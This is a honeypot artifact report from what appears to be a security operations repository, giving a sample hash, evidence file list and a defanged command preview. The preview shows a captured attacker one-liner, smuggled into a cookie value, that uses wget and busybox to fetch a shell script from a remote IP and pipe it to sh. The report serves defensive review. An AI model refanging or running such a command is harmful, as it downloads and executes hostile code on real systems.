# 402acb25980f110cc3da0210be97728fe151eff4d85396e78cc6a5ccabcf9e0a

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `402acb25980f110cc3da0210be97728fe151eff4d85396e78cc6a5ccabcf9e0a` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
setCookie=`cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s zyxsc;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s z
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
